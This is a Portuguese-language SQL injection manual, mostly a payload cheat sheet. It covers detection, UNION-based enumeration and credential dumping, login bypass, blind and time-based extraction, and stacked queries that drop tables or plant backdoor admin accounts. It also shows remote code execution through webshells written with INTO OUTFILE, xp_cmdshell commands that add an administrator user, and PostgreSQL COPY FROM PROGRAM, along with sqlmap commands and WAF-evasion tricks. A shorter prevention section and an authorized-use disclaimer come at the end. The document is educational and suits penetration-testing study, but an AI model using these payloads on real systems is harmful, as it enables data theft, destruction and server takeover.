# SQL Injection Manual

## O que é SQL Injection?

**SQL Injection (SQLi)** é uma vulnerabilidade de segurança que permite que um atacante interfira nas consultas SQL que uma aplicação faz ao seu banco de dados. Esta vulnerabilidade ocorre quando a aplicação aceita entrada do usuário e a incorpora diretamente em queries SQL sem validação ou sanitização adequada, permitindo que o atacante execute comandos SQL arbitrários.

---

## Como Funciona a Vulnerabilidade

### Conceito Básico

A vulnerabilidade SQL Injection surge quando código inseguro como este é utilizado:

```php
<?php
$username = $_POST['username'];
$password = $_POST['password'];
$query = "SELECT * FROM users WHERE username='$username' AND password='$password'";
$result = mysqli_query($conn, $query);
?>
```

Neste exemplo, os parâmetros `username` e `password` são usados diretamente na query SQL sem nenhuma validação, permitindo que um atacante manipule a lógica da consulta.

### Comandos SQL Básicos

**SELECT** → Pegar dados do banco de dados

```sql
SELECT nome, idade FROM users;
```

**INSERT** → Inserir dados

```sql
INSERT INTO users (nome, idade, sexo) VALUES ('Lucas', 26, 'M');
```

**UPDATE** → Atualiza dados do banco

```sql
UPDATE users SET idade=224 WHERE nome = "Lucas";
```

**DELETE** → Deleta dados do banco

```sql
DELETE FROM users WHERE nome = "Lucas";
```

---

## Tipos de SQL Injection

### 1. In-Band SQLi (Classic SQLi)

O atacante usa o mesmo canal de comunicação para lançar o ataque e receber os resultados.

**Union-Based SQLi:**

Usa o operador UNION para combinar resultados de múltiplas queries.

**Error-Based SQLi:**

Força o banco a retornar erros que revelam informações sobre sua estrutura.

### 2. Inferential SQLi (Blind SQLi)

O atacante não vê os resultados diretamente, mas infere informações baseado no comportamento da aplicação.

**Boolean-Based Blind:**

Observa diferenças nas respostas (verdadeiro/falso).

**Time-Based Blind:**

Usa funções de delay para inferir se condições são verdadeiras.

### 3. Out-of-Band SQLi

Usa canais diferentes para lançar o ataque e receber resultados (ex: DNS, HTTP requests).

---

## Técnicas de Exploração

### 1. Detectar SQL Injection

**Payloads iniciais para testar:**

```sql
'
"
`
')
")
`)
'))
"))
`))
```

**Sinais de vulnerabilidade:**

- Erros de SQL na resposta
- Mudanças no comportamento da aplicação
- Diferenças no tempo de resposta

### 2. Detectar Quantidade de Colunas

**Método ORDER BY:**

```sql
' ORDER BY 1-- -
' ORDER BY 2-- -
' ORDER BY 3-- -
' ORDER BY 4-- -
```

Continue incrementando até receber erro. O último número antes do erro é a quantidade de colunas.

**Método UNION SELECT:**

```sql
' UNION SELECT NULL-- -
' UNION SELECT NULL,NULL-- -
' UNION SELECT NULL,NULL,NULL-- -
' UNION SELECT NULL,NULL,NULL,NULL-- -
```

### 3. Union-Based Exploitation

**Estrutura básica:**

```sql
' UNION SELECT 1,2,3,4-- -
' UNION SELECT 1,2,3,4#
' UNION SELECT 1,2,3,4;#
```

**Descobrir versão do banco:**

```sql
# MySQL
' UNION SELECT 1,@@version,3,4-- -
' UNION SELECT 1,version(),3,4-- -

# PostgreSQL
' UNION SELECT 1,version(),3,4-- -

# MSSQL
' UNION SELECT 1,@@version,3,4-- -

# Oracle
' UNION SELECT 1,banner,3,4 FROM v$version-- -
```

**Descobrir banco de dados atual:**

```sql
# MySQL
' UNION SELECT 1,database(),3,4-- -
' UNION SELECT 1,schema_name,3,4 FROM information_schema.schemata-- -

# PostgreSQL
' UNION SELECT 1,current_database(),3,4-- -

# MSSQL
' UNION SELECT 1,DB_NAME(),3,4-- -
```

**Descobrir usuário atual:**

```sql
# MySQL
' UNION SELECT 1,user(),3,4-- -
' UNION SELECT 1,current_user(),3,4-- -

# PostgreSQL
' UNION SELECT 1,current_user,3,4-- -

# MSSQL
' UNION SELECT 1,SYSTEM_USER,3,4-- -
```

### 4. Enumeração de Banco de Dados

**Listar todos os bancos de dados:**

```sql
# MySQL
' UNION SELECT 1,schema_name,3,4 FROM information_schema.schemata-- -
' UNION SELECT 1,GROUP_CONCAT(schema_name),3,4 FROM information_schema.schemata-- -

# PostgreSQL
' UNION SELECT 1,datname,3,4 FROM pg_database-- -

# MSSQL
' UNION SELECT 1,name,3,4 FROM master..sysdatabases-- -
```

**Listar tabelas de um banco específico:**

```sql
# MySQL
' UNION SELECT 1,table_name,3,4 FROM information_schema.tables WHERE table_schema='database_name'-- -
' UNION SELECT 1,GROUP_CONCAT(table_name),3,4 FROM information_schema.tables WHERE table_schema='database_name'-- -

# PostgreSQL
' UNION SELECT 1,tablename,3,4 FROM pg_tables WHERE schemaname='public'-- -

# MSSQL
' UNION SELECT 1,name,3,4 FROM sysobjects WHERE xtype='U'-- -
```

**Listar colunas de uma tabela específica:**

```sql
# MySQL
' UNION SELECT 1,column_name,3,4 FROM information_schema.columns WHERE table_name='users'-- -
' UNION SELECT 1,GROUP_CONCAT(column_name),3,4 FROM information_schema.columns WHERE table_name='users'-- -

# PostgreSQL
' UNION SELECT 1,column_name,3,4 FROM information_schema.columns WHERE table_name='users'-- -

# MSSQL
' UNION SELECT 1,name,3,4 FROM syscolumns WHERE id=(SELECT id FROM sysobjects WHERE name='users')-- -
```

**Extrair dados:**

```sql
# MySQL
' UNION SELECT 1,username,password,4 FROM users-- -
' UNION SELECT 1,GROUP_CONCAT(username,':',password),3,4 FROM users-- -

# Exemplo específico
' UNION SELECT 1,name,3,4 FROM flag-- -
```

### 5. Bypass de Autenticação

**Payloads comuns:**

```sql
# Comentário SQL para ignorar resto da query
admin' --
admin' #
admin'/*
' OR '1'='1' --
' OR '1'='1' #
' OR '1'='1'/*

# Boolean-based
admin' OR 1=1--
' OR 'x'='x
' OR 1=1--
') OR ('1'='1

# Com senha
admin' OR '1'='1' -- -
' OR '1'='1' -- -
```

**Exemplo de bypass:**

```sql
# Query original
SELECT * FROM users WHERE username='admin' AND password='senha123'

# Payload injetado
username: admin' OR '1'='1' -- -
password: qualquercoisa

# Query resultante
SELECT * FROM users WHERE username='admin' OR '1'='1' -- -' AND password='qualquercoisa'
# Tudo após -- é comentário, então a verificação de senha é ignorada
```

### 6. Boolean-Based Blind SQLi

Quando não há output visível, mas há diferenças no comportamento:

```sql
# Testar se vulnerável
' AND 1=1-- -  (deve retornar resposta normal)
' AND 1=2-- -  (deve retornar resposta diferente)

# Descobrir tamanho do nome do banco
' AND LENGTH(database())=1-- -
' AND LENGTH(database())=2-- -
' AND LENGTH(database())=3-- -

# Extrair caracteres do nome do banco
' AND SUBSTRING(database(),1,1)='a'-- -
' AND SUBSTRING(database(),1,1)='b'-- -
' AND SUBSTRING(database(),1,1)='c'-- -

# Verificar se usuário é admin
' AND (SELECT user FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')-- -
```

### 7. Time-Based Blind SQLi

Quando não há diferença visível nas respostas:

```sql
# MySQL
' AND SLEEP(5)-- -
' AND IF(1=1,SLEEP(5),0)-- -
' AND IF(LENGTH(database())=5,SLEEP(5),0)-- -
' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)-- -

# PostgreSQL
'; SELECT pg_sleep(5)-- -
'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END-- -

# MSSQL
'; WAITFOR DELAY '00:00:05'-- -
'; IF (1=1) WAITFOR DELAY '00:00:05'-- -

# Oracle
' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)=1-- -
```

### 8. Stacked Queries

Executar múltiplas queries separadas por ponto e vírgula:

```sql
# Inserir novo usuário admin
'; INSERT INTO users (username,password) VALUES ('hacker','pass123')-- -

# Atualizar senha de admin
'; UPDATE users SET password='novasenha' WHERE username='admin'-- -

# Deletar tabela
'; DROP TABLE logs-- -

# Criar novo admin
'; INSERT INTO admins (user,pass) VALUES ('backdoor','123456')-- -
```

---

## SQL Injection para RCE (Remote Code Execution)

### Método 1: Escrever WebShell via SELECT INTO OUTFILE

**MySQL - Requisitos:**

- Permissão FILE
- Conhecer caminho do webroot
- Permissões de escrita no diretório

**Payload básico:**

```sql
' UNION SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php'-- -
```

**Payloads avançados:**

```sql
# WebShell simples
' UNION SELECT 1,2,"<?php system(\$_GET[cmd]);?>",4 INTO OUTFILE "/var/www/html/cmd.php"-- -

# Com múltiplas colunas
' UNION SELECT 1,"<?php system(\$_GET['x']);?>",3,4 INTO OUTFILE "/var/www/html/shell.php"-- -

# WebShell com eval
' UNION SELECT "<?php eval(\$_POST[x]);?>" INTO OUTFILE "/var/www/html/eval.php"-- -

# Se estiver em subdiretório
' UNION SELECT 1,2,"<?php system(id);?>" INTO OUTFILE "/var/www/html/classes/id.php"-- -

# Escapando caracteres
SELECT "\<?php system(\$_GET\[cmd\]);?\>" INTO OUTFILE "/var/www/html/cmd.php"
```

**Caminhos comuns do webroot:**

```
# Linux
/var/www/html/
/var/www/html/uploads/
/usr/share/nginx/html/
/var/www/
/home/user/public_html/

# Windows
C:\\inetpub\\wwwroot\\
C:\\xampp\\htdocs\\
C:\\wamp\\www\\
```

**Testar permissões:**

```sql
# Verificar se tem privilégio FILE
' UNION SELECT 1,GRANTEE,PRIVILEGE_TYPE,4 FROM information_schema.user_privileges WHERE PRIVILEGE_TYPE='FILE'-- -

# Verificar variável secure_file_priv (se vazia, pode escrever em qualquer lugar)
' UNION SELECT 1,@@secure_file_priv,3,4-- -
```

### Método 2: Usar INTO DUMPFILE

Similar ao OUTFILE, mas preserva dados binários:

```sql
' UNION SELECT "<?php system($_GET['c']); ?>" INTO DUMPFILE '/var/www/html/s.php'-- -
```

### Método 3: MySQL UDF (User Defined Functions)

Criar funções personalizadas para executar comandos:

```sql
# Criar função sys_exec
' UNION SELECT 1,load_file('/usr/lib/lib_mysqludf_[sys.so](http://sys.so)'),3,4 INTO DUMPFILE '/usr/lib/mysql/plugin/[udf.so](http://udf.so)'-- -
'; CREATE FUNCTION sys_exec RETURNS STRING SONAME '[udf.so](http://udf.so)'-- -
'; SELECT sys_exec('whoami')-- -
```

### Método 4: MSSQL - xp_cmdshell

```sql
# Habilitar xp_cmdshell
'; EXEC sp_configure 'show advanced options', 1-- -
'; RECONFIGURE-- -
'; EXEC sp_configure 'xp_cmdshell', 1-- -
'; RECONFIGURE-- -

# Executar comandos
'; EXEC xp_cmdshell 'whoami'-- -
'; EXEC xp_cmdshell 'net user hacker Pass123! /add'-- -
'; EXEC xp_cmdshell 'net localgroup administrators hacker /add'-- -
```

### Método 5: PostgreSQL - COPY TO/FROM

```sql
# Escrever arquivo
'; COPY (SELECT '<?php system($_GET[0]); ?>') TO '/var/www/html/shell.php'-- -

# Executar comandos via extensões
'; CREATE TABLE cmd(output text)-- -
'; COPY cmd FROM PROGRAM 'id'-- -
'; SELECT * FROM cmd-- -
```

---

## Exemplos Práticos de Exploração

### Cenário 1: Login Bypass

**Código vulnerável:**

```php
<?php
$user = $_POST['username'];
$pass = $_POST['password'];
$query = "SELECT * FROM users WHERE username='$user' AND password='$pass'";
?>
```

**Exploração:**

```
Username: admin' OR '1'='1' -- -
Password: qualquercoisa

Query resultante:
SELECT * FROM users WHERE username='admin' OR '1'='1' -- -' AND password='qualquercoisa'
```

### Cenário 2: Busca de Produtos

**Código vulnerável:**

```php
<?php
$search = $_GET['q'];
$query = "SELECT * FROM products WHERE name LIKE '%$search%'";
?>
```

**Exploração para extrair dados:**

```sql
# URL: /search.php?q=test' UNION SELECT 1,username,password,4 FROM users-- -

Query resultante:
SELECT * FROM products WHERE name LIKE '%test' UNION SELECT 1,username,password,4 FROM users-- -%'
```

### Cenário 3: Visualização de Notícias por ID

**Código vulnerável:**

```php
<?php
$id = $_GET['id'];
$query = "SELECT * FROM news WHERE id=$id";
?>
```

**Exploração:**

```sql
# URL: /news.php?id=1 UNION SELECT 1,database(),user(),4-- -

Query resultante:
SELECT * FROM news WHERE id=1 UNION SELECT 1,database(),user(),4-- -
```

### Cenário 4: Blind SQLi em Cookie

**Código vulnerável:**

```php
<?php
$session = $_COOKIE['session_id'];
$query = "SELECT * FROM sessions WHERE id='$session'";
?>
```

**Exploração Time-Based:**

```
Cookie: session_id=abc123' AND IF(1=1,SLEEP(5),0)-- -
```

### Cenário 5: Second-Order SQLi

Dados maliciosos são armazenados e executados posteriormente:

**Passo 1 - Registro:**

```sql
Username: admin'-- -
Email: [test@test.com](mailto:test@test.com)
```

**Passo 2 - Query posterior usa o username sem sanitização:**

```php
$query = "SELECT * FROM users WHERE username='$stored_username'";
# Resulta em: SELECT * FROM users WHERE username='admin'-- -'
```

---

## Ferramentas de Exploração

### SQLMap

**Ferramenta automatizada mais popular para SQLi:**

```bash
# Teste básico
sqlmap -u ""

# Com cookie de autenticação
sqlmap -u "" --cookie="PHPSESSID=abc123"

# POST request
sqlmap -u "" --data="user=admin&pass=123"

# Descobrir bancos de dados
sqlmap -u "" --dbs

# Listar tabelas de um banco
sqlmap -u "" -D database_name --tables

# Listar colunas de uma tabela
sqlmap -u "" -D database_name -T users --columns

# Dump de dados
sqlmap -u "" -D database_name -T users --dump

# Obter shell
sqlmap -u "" --os-shell

# Ler arquivo do sistema
sqlmap -u "" --file-read="/etc/passwd"

# Escrever arquivo
sqlmap -u "" --file-write="shell.php" --file-dest="/var/www/html/shell.php"

# Nível e risco de testes
sqlmap -u "" --level=5 --risk=3

# Especificar parâmetro vulnerável
sqlmap -u "" -p id

# Bypass WAF
sqlmap -u "" --tamper=space2comment
```

### Burp Suite

1. Interceptar requisição
2. Enviar para Repeater (Ctrl+R)
3. Modificar parâmetros com payloads SQLi
4. Observar diferenças nas respostas
5. Usar Intruder para automatizar testes com wordlists

### SQLiv (Mass SQL Scanner)

```bash
# Escanear múltiplos alvos
python [sqliv.py](http://sqliv.py) -t targets.txt

# Escanear via dork
python [sqliv.py](http://sqliv.py) -d "inurl:product.php?id="
```

### NoSQLMap

Para bancos NoSQL (MongoDB, CouchDB):

```bash
python [nosqlmap.py](http://nosqlmap.py) -u "" -p id
```

---

## Bypass de Filtros e WAFs

### 1. Comentários

```sql
# Espaços substituídos por comentários
'/**/UNION/**/SELECT/**/1,2,3-- -

# Comentários inline
'/*!UNION*//*!SELECT*/1,2,3-- -

# Comentários com versão MySQL
'/*!50000UNION*//*!50000SELECT*/1,2,3-- -
```

### 2. Encoding

```sql
# URL encoding
' UNION SELECT → %27%20UNION%20SELECT

# Double URL encoding
' → %2527

# Unicode
' → %u0027

# Hex encoding
SELECT → 0x53454c454354
```

### 3. Variações de Case

```sql
' UnIoN SeLeCt 1,2,3-- -
' uNiOn sElEcT 1,2,3-- -
```

### 4. Substituição de Espaços

```sql
# Tab
'UNION%09SELECT%091,2,3-- -

# Newline
'UNION%0ASELECT%0A1,2,3-- -

# Comentário
'UNION/**/SELECT/**/1,2,3-- -

# Parênteses
'UNION(SELECT(1),2,3)-- -

# Plus
'UNION+SELECT+1,2,3-- -
```

### 5. Equivalentes de Operadores

```sql
# AND
' && '1'='1
' %26%26 '1'='1

# OR
' || '1'='1
' %7C%7C '1'='1

# Igual (=)
' LIKE '
' REGEXP '
' RLIKE '
```

### 6. Bypass de Palavras-Chave Bloqueadas

```sql
# Se "UNION" está bloqueado
' /*!50000UNION*/ SELECT 1,2,3-- -
' UNI/**/ON SE/**/LECT 1,2,3-- -
' UniOn SeLeCt 1,2,3-- -

# Se "SELECT" está bloqueado
' UNION /*!50000SELECT*/ 1,2,3-- -
' UNION SEL/**/ECT 1,2,3-- -

# Se "OR" está bloqueado
' || '1'='1
' OR 1=1-- - → '/**/OR/**/1=1-- -
```

### 7. Bypass de Quotes

```sql
# Usar hex
' UNION SELECT 1,0x61646d696e,3-- -  (0x61646d696e = 'admin')

# Usar char()
' UNION SELECT 1,CHAR(97,100,109,105,110),3-- -

# Usar concat()
' UNION SELECT 1,CONCAT(CHAR(97),CHAR(100)),3-- -
```

---

## Detecção e Identificação

### Sinais de Vulnerabilidade

<aside>
⚠️

**Indicadores de SQL Injection:**

- Erros de SQL na resposta (syntax error, MySQL/PostgreSQL/MSSQL errors)
- Parâmetros numéricos em URLs (`id=`, `page=`, `cat=`)
- Mudança de comportamento ao adicionar quotes (`'`, `"`)
- Diferenças no tempo de resposta
- Mensagens de erro revelando informações do banco
</aside>

### Testando Manualmente

**Payloads iniciais:**

```sql
1. ' OR '1'='1
2. ' OR 1=1-- -
3. admin' --
4. 1' AND '1'='1
5. 1' AND SLEEP(5)-- -
```

**Pontos de injeção comuns:**

- Parâmetros GET (`?id=1`)
- Parâmetros POST (formulários)
- Headers HTTP (User-Agent, Cookie, Referer)
- JSON/XML payloads em APIs

---

## Prevenção e Mitigação

### 1. Prepared Statements (Parameterized Queries)

**A melhor defesa contra SQL Injection:**

**PHP (PDO):**

```php
<?php
$stmt = $pdo->prepare('SELECT * FROM users WHERE username = ? AND password = ?');
$stmt->execute([$username, $password]);
$user = $stmt->fetch();
?>
```

**PHP (MySQLi):**

```php
<?php
$stmt = $mysqli->prepare('SELECT * FROM users WHERE username = ? AND password = ?');
$stmt->bind_param('ss', $username, $password);
$stmt->execute();
$result = $stmt->get_result();
?>
```

**Python:**

```python
cursor.execute('SELECT * FROM users WHERE username = ? AND password = ?', (username, password))
```

**Java:**

```java
PreparedStatement stmt = connection.prepareStatement("SELECT * FROM users WHERE username = ? AND password = ?");
stmt.setString(1, username);
stmt.setString(2, password);
ResultSet rs = stmt.executeQuery();
```

### 2. Stored Procedures

```sql
CREATE PROCEDURE GetUser
    @username VARCHAR(50),
    @password VARCHAR(50)
AS
BEGIN
    SELECT * FROM users WHERE username = @username AND password = @password
END
```

### 3. Validação de Input

```php
<?php
// Whitelist de valores permitidos
$allowed_ids = [1, 2, 3, 4, 5];
$id = (int)$_GET['id'];

if (!in_array($id, $allowed_ids)) {
    die('Invalid ID');
}

// Validação de tipo
$id = filter_input(INPUT_GET, 'id', FILTER_VALIDATE_INT);
if ($id === false) {
    die('Invalid ID');
}
?>
```

### 4. Escape de Caracteres Especiais

```php
<?php
// MySQL
$username = mysqli_real_escape_string($conn, $_POST['username']);

// PostgreSQL
$username = pg_escape_string($conn, $_POST['username']);
?>
```

**⚠️ Nota:** Escaping sozinho NÃO é suficiente. Use prepared statements sempre que possível.

### 5. Princípio do Menor Privilégio

```sql
-- Criar usuário com privilégios limitados
CREATE USER 'webapp'@'[localhost](http://localhost)' IDENTIFIED BY 'senha';
GRANT SELECT, INSERT, UPDATE ON database.* TO 'webapp'@'[localhost](http://localhost)';

-- Remover privilégios perigosos
REVOKE FILE ON *.* FROM 'webapp'@'[localhost](http://localhost)';
REVOKE CREATE, DROP ON *.* FROM 'webapp'@'[localhost](http://localhost)';
```

### 6. WAF (Web Application Firewall)

- ModSecurity (OWASP Core Rule Set)
- Cloudflare WAF
- AWS WAF
- Imperva
- F5 Advanced WAF

### 7. Configurações Seguras

**PHP.ini:**

```
magic_quotes_gpc = Off  (deprecated)
display_errors = Off
log_errors = On
```

**MySQL:**

```
# Desabilitar LOCAL INFILE
local-infile=0

# Restringir onde arquivos podem ser lidos/escritos
secure-file-priv="/var/lib/mysql-files/"
```

---

## Checklist de Teste

- [ ]  Testar todos os parâmetros GET/POST com quotes (`'`, `"`)
- [ ]  Testar payloads de bypass de autenticação
- [ ]  Determinar número de colunas (ORDER BY / UNION)
- [ ]  Identificar colunas visíveis na resposta
- [ ]  Enumerar nome e versão do banco de dados
- [ ]  Enumerar nomes de bancos, tabelas e colunas
- [ ]  Extrair dados sensíveis (credenciais, tokens)
- [ ]  Testar Blind SQLi (Boolean e Time-Based)
- [ ]  Testar Stacked Queries
- [ ]  Tentar obter RCE via INTO OUTFILE/xp_cmdshell
- [ ]  Testar injeção em headers (Cookie, User-Agent, Referer)
- [ ]  Testar bypass de WAF com encoding e obfuscação
- [ ]  Verificar possibilidade de ler arquivos do sistema
- [ ]  Verificar possibilidade de escrever arquivos
- [ ]  Documentar todos os achados com PoC completo

---

## Diferenças Entre Bancos de Dados

### MySQL / MariaDB

```sql
# Comentários: -- , #, /**/
# String concatenation: CONCAT()
# Sleep: SLEEP(5)
# Versão: @@version, VERSION()
# Banco atual: DATABASE()
# Usuário: USER(), CURRENT_USER()
# Listar databases: SELECT schema_name FROM information_schema.schemata
```

### PostgreSQL

```sql
# Comentários: -- , /**/
# String concatenation: ||
# Sleep: pg_sleep(5)
# Versão: version()
# Banco atual: current_database()
# Usuário: current_user
# Listar databases: SELECT datname FROM pg_database
```

### MSSQL

```sql
# Comentários: -- , /**/
# String concatenation: +
# Sleep: WAITFOR DELAY '00:00:05'
# Versão: @@version
# Banco atual: DB_NAME()
# Usuário: SYSTEM_USER, USER_NAME()
# Listar databases: SELECT name FROM master..sysdatabases
```

### Oracle

```sql
# Comentários: -- , /**/
# String concatenation: ||
# Sleep: DBMS_PIPE.RECEIVE_MESSAGE('a',5)
# Versão: SELECT banner FROM v$version
# Usuário: SELECT user FROM dual
# Listar tables: SELECT table_name FROM all_tables
```

### SQLite

```sql
# Comentários: -- , /**/
# String concatenation: ||
# Versão: SELECT sqlite_version()
# Listar tables: SELECT name FROM sqlite_master WHERE type='table'
```

---

## Recursos e Ferramentas Úteis

### Wordlists

```bash
# SecLists
/usr/share/seclists/Fuzzing/SQLi/
/usr/share/seclists/Fuzzing/SQLi/Generic-SQLi.txt
/usr/share/seclists/Fuzzing/SQLi/quick-SQLi.txt

# PayloadsAllTheThings
[https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
```

### Cheat Sheets Online

- **PortSwigger SQL Injection Cheat Sheet**
- **PentestMonkey SQL Injection Cheat Sheet**
- **PayloadsAllTheThings - SQL Injection**
- **HackTricks - SQL Injection**
- **OWASP SQL Injection Prevention Cheat Sheet**

### Labs para Prática

**Plataformas:**

- PortSwigger Web Security Academy (SQL Injection labs)
- HackTheBox (Machines com SQLi)
- TryHackMe (SQL Injection rooms)
- PentesterLab (SQL Injection exercises)
- DVWA (Damn Vulnerable Web Application)
- bWAPP
- WebGoat
- SQLi-Labs (GitHub)

**Challenges:**

- Root-Me - SQL Injection
- HackThisSite - SQL Injection challenges
- OverTheWire - Natas

---

## Recursos Adicionais

**Leitura Recomendada:**

- OWASP Testing Guide - SQL Injection
- OWASP Top 10 - A03:2021 – Injection
- PortSwigger Research - Advanced SQL Injection
- SQL Injection Attacks and Defense (Book)

**Vídeos e Cursos:**

- OWASP SQL Injection Tutorial
- PentesterAcademy - SQL Injection Course
- TCM Security - Practical Ethical Hacking

**Comunidades:**

- r/netsec
- HackerOne Hacktivity
- Bug Bounty Forums

---

> **Nota Importante:** Este conteúdo é apenas para fins educacionais e de teste autorizado. Explorar vulnerabilidades sem permissão explícita é ilegal e antiético. Sempre obtenha autorização por escrito antes de realizar testes de penetração.
>